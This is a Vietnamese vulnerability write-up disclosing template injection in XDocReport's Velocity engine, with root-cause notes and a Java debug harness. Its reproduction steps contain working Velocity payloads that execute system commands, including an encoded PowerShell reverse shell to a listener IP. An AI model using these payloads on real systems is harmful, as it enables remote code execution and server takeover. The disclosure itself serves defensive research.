# CVE-2025-64087 (SSTI Velocity)

# Server-Side Template Injection (SSTI) in XDocReport allows Remote Code Execution via Apache Velocity engine [HIGH]

## Bug Definition

Tổng quan về lỗ hổng

- Server-Side Template Injection (SSTI) là một lỗ hổng bảo mật web cho phép tấn công chèn mã độc vào các mẫu (templates) được sử dụng bởi các hệ thống quản lý nội dung (CMS) và các khung (framework) web, nhằm thực hiện các cuộc tấn công từ xa, thực hiện lấy thông tin nhạy cảm hoặc thực hiện các hoạt động xâm nhập hệ thống.

- SSTI là một biến thể của lỗ hổng Injection (như SQL Injection, XSS, v.v.), trong đó tin tặc tận dụng việc sử dụng các hệ thống templates để triển khai mã độc từ xa. Khi một tấn công SSTI được thực hiện thành công, tin tặc có thể thực thi mã của riêng mình trên máy chủ ở phía máy chủ, cho phép họ thực hiện các cuộc tấn công từ xa, như thu thập thông tin nhạy cảm, thực hiện các hoạt động xâm nhập hệ thống, và truy cập các tài nguyên không được ủy quyền.

- Lỗ hổng SSTI thường xảy ra do việc sử dụng các hệ thống templates không an toàn, hoặc do không kiểm tra và xử lý các tham số đầu vào trước khi chèn chúng vào các mẫu. Nếu một tấn công SSTI được thực hiện thành công, hậu quả có thể là nghiêm trọng và gây ra tổn thất lớn cho tổ chức bị tấn công.

Ảnh hưởng kinh doanh

- Lỗ hổng SSTI có thể gây ra nhiều hậu quả nghiêm trọng, bao gồm:

- Thực thi mã độc: Kẻ tấn công có thể sử dụng lỗ hổng này để thực thi mã độc trên máy chủ, cho phép tấn công đánh cắp dữ liệu, thực hiện các hành động không hợp pháp trên hệ thống, thậm chí kiểm soát hoàn toàn máy chủ.

- Tiết lộ thông tin nhạy cảm: SSTI có thể cho phép tấn công đọc, thay đổi hoặc xóa các tệp tin trên máy chủ. Nếu các tệp tin này chứa thông tin nhạy cảm, như tài khoản và mật khẩu, thì kẻ tấn công có thể dễ dàng tiết lộ thông tin này.

- Tấn công đe dọa hoặc lừa đảo người dùng: Kẻ tấn công có thể sử dụng SSTI để thực hiện các tấn công đe dọa hoặc lừa đảo người dùng, bằng cách thay đổi nội dung của trang web hoặc thêm các nút tùy chỉnh giả mạo. Nếu người dùng bấm vào các nút này, kẻ tấn công có thể đánh cắp thông tin người dùng hoặc cài đặt phần mềm độc hại trên máy tính của họ.

## Severity HIGH

![image](https://hackmd.io/_uploads/SJMMU5EReg.png)

## Description and Impact

fr.opensagres.xdocreport.template.velocity

A Server-Side Template Injection (SSTI) vulnerability was found in OpenSAGRES XDocReport when processing DOCX templates with the velocity engine. Under certain configurations, crafted templates can lead to Remote Code Execution (RCE).

Trang web quản lý nhân sự cho phép người dùng upload tệp tài liệu `.docx` lên hệ thống. Trong quá trình xử lý, ứng dụng sử dụng template engine velocity (tại file ) để render nội dung mà không có cơ chế kiểm soát hoặc lọc nội dung đầu vào.
Lỗ hổng này cho phép attacker chèn các biểu thức độc hại vào file .docx (template), dẫn đến Remote Code Execution (RCE) trên máy chủ và có thể bị lợi dụng để đánh cắp thông tin hoặc chiếm quyền điều khiển hệ thống.
![image](https://hackmd.io/_uploads/B1JJJ5E0el.png)

## Affected component

fr.opensagres.xdocreport.template.velocity — XDocReport (versions =< 2.1.0).

## Root cause analysis

`https://github.com/opensagres/xdocreport/blob/master/template/fr.opensagres.xdocreport.template.velocity/src/main/java/fr/opensagres/xdocreport/template/velocity/internal/ExtractVariablesVelocityVisitor.java`

![image](https://hackmd.io/_uploads/HytQVd9Cgx.png)

velocityEngine.evaluate(...) là phương thức chuẩn/“mặc định” của Apache Velocity để đánh giá (evaluate) một template từ một Reader (hoặc từ một String) sử dụng một Context và ghi ra Writer. Nó thực thi cú pháp VTL (Velocity Template Language) giống như Template.merge(...)

### Sự khác nhau thực tế giữa evaluate và Template.merge

- evaluate: parse từ Reader/String → tiện khi template là dynamic/untrusted.

- getTemplate(...).merge(...): tải template đã được resource loader xử lý (caching, encoding…), sau đó merge. Về mặt khả năng thực thi VTL thì cả hai đều thực thi các expression giống nhau; khác nhau chủ yếu là nơi/chế độ tải template.

## Step to reproduce

1. Người dùng thực hiện upload file `.docx` có nội dung bên trong là payload sau:

![image](https://hackmd.io/_uploads/SkM0MQtRlx.png)

```java
#set($x="abc")
#set($str=$x.getClass().forName("java.lang.String"))
#set($cha=$x.getClass().forName("java.lang.Character"))
#set($r=$x.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami"))
$r.waitFor()
#set($out=$r.getInputStream())
#set($result="")
#foreach($i in [1..$out.available()])
#set($result = $result + $str.valueOf($cha.toChars($out.read())))
#end
$result
```

![image](https://hackmd.io/_uploads/SJlyXQYRlx.png)

2. Thấy có thể thực thi thành công lệnh hệ thống

![image](https://hackmd.io/_uploads/Byh1mmY0xl.png)

3. Tương tự với payload sau:

```java
#set($x="abc")
#set($str=$x.getClass().forName("java.lang.String"))
#set($cha=$x.getClass().forName("java.lang.Character"))
#set($r=$x.getClass().forName("java.lang.Runtime").getRuntime().exec("cmd /c dir d:"))
$r.waitFor()
#set($out=$r.getInputStream())
#set($result="")
#foreach($i in [1..$out.available()])
#set($result = $result + $str.valueOf($cha.toChars($out.read())))
#end
$result
```

![image](https://hackmd.io/_uploads/SkPpm7t0gl.png)

![image](https://hackmd.io/_uploads/ryfAmXYAel.png)

![image](https://hackmd.io/_uploads/ryR0m7FAee.png)

4. Tương tự

```java
#set($x="abc")
#set($str=$x.getClass().forName("java.lang.String"))
#set($cha=$x.getClass().forName("java.lang.Character"))
#set($r=$x.getClass().forName("java.lang.Runtime").getRuntime().exec("calc"))
$r.waitFor()
#set($out=$r.getInputStream())
#set($result="")
#foreach($i in [1..$out.available()])
#set($result = $result + $str.valueOf($cha.toChars($out.read())))
#end
$result
```

![image](https://hackmd.io/_uploads/S1Hf4XK0lx.png)

![image](https://hackmd.io/_uploads/Byv-N7KCgl.png)

5. Nâng impact lên RCE

- Máy lắng nghe là wsl có địa chỉ ip là `172.26.208.130`

![image](https://hackmd.io/_uploads/By1gvQYRll.png)

- khai thác với payload sau:

```java
#set($x="abc")
#set($str=$x.getClass().forName("java.lang.String"))
#set($cha=$x.getClass().forName("java.lang.Character"))
#set($r=$x.getClass().forName("java.lang.Runtime").getRuntime().exec("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAyADYALgAyADAAOAAuADEAMwAwACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="))
$r.waitFor()
#set($out=$r.getInputStream())
#set($result="")
#foreach($i in [1..$out.available()])
#set($result = $result + $str.valueOf($cha.toChars($out.read())))
#end
$result
```

![image](https://hackmd.io/_uploads/HyOFEQFRgx.png)

- Cho file `.docx` qua xdocreport xử lý

![image](https://hackmd.io/_uploads/rJ0PEmt0le.png)

- Thấy bắt được shell trả về tại máy wsl

![image](https://hackmd.io/_uploads/rk4DEQY0ll.png)

## Solution

## Thiết lập môi trường debug

- tại file Main.java

```java
package org.example;

import fr.opensagres.xdocreport.document.IXDocReport;
import fr.opensagres.xdocreport.document.registry.XDocReportRegistry;
import fr.opensagres.xdocreport.template.IContext;
import fr.opensagres.xdocreport.template.TemplateEngineKind;

import java.io.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class Main {

    public static void main(String[] args) {
        try {
            // Đọc file đầu vào chứa biểu thức Velocity
            File docxTemplate = new File("C:\\Users\\HP\\Downloads\\vcspentest.docx"); // File đầu vào
            InputStream input = new FileInputStream(docxTemplate);

//             Load template sử dụng Velocity
            IXDocReport report = XDocReportRegistry.getRegistry().loadReport(input, TemplateEngineKind.Velocity);



            // Tạo context - có thể để trống nếu chỉ test biểu thức độc lập
            IContext context = report.createContext();

            // Xuất ra file mới
            OutputStream out = new FileOutputStream(new File("C:\\Users\\HP\\Downloads\\results.docx"));
            report.process(context, out);

            System.out.println("✅ Đã tạo file result.docx thành công.");
        } catch (Exception e) {
            System.err.println("❌ Lỗi xử lý file:");
            e.printStackTrace();
        }
    }
}

```

- Thư viện cần import

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>vcs1</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>18</maven.compiler.source>
        <maven.compiler.target>18</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <!-- Template engine: FreeMarker -->
        <dependency>
            <groupId>fr.opensagres.xdocreport</groupId>
            <artifactId>fr.opensagres.xdocreport.template.freemarker</artifactId>
            <version>2.1.0</version>
        </dependency>

        <dependency>
            <groupId>fr.opensagres.xdocreport</groupId>
            <artifactId>fr.opensagres.xdocreport.template.velocity</artifactId>
            <version>2.1.0</version>
        </dependency>

        <dependency>
            <groupId>fr.opensagres.xdocreport</groupId>
            <artifactId>fr.opensagres.xdocreport.document.docx</artifactId>
            <version>2.0.3</version>
        </dependency>
    </dependencies>
</project>

```

## Debug phân tích source sink

- report.process(context, out) — đây là điểm template được render/ghi ra file

![image](https://hackmd.io/_uploads/rkoHg_50xe.png)

![image](https://hackmd.io/_uploads/SkqUe_qRle.png)

![image](https://hackmd.io/_uploads/H19wx_5Cxx.png)

![image](https://hackmd.io/_uploads/BJfue_cCex.png)

![image](https://hackmd.io/_uploads/S1yKeO90ex.png)

![image](https://hackmd.io/_uploads/rJOKxOqCxg.png)

![image](https://hackmd.io/_uploads/S1ecx_50xx.png)

![image](https://hackmd.io/_uploads/rktjeO90xe.png)

![image](https://hackmd.io/_uploads/rJQnxd9Ree.png)

![image](https://hackmd.io/_uploads/S1j3x_c0gx.png)

![image](https://hackmd.io/_uploads/rkuI-u9Cel.png)

![image](https://hackmd.io/_uploads/BJTFbu9Clg.png)
![image](https://hackmd.io/_uploads/ByWEf_cRxx.png)
    
![image](https://hackmd.io/_uploads/Hk1ofO50xx.png)

![image](https://hackmd.io/_uploads/BypizO9Rgx.png)

## Tài liệu

- https://drive.google.com/drive/folders/1pLguRIVrqyXcy1jE35nW-wAvBR0sHb7x?usp=drive_link
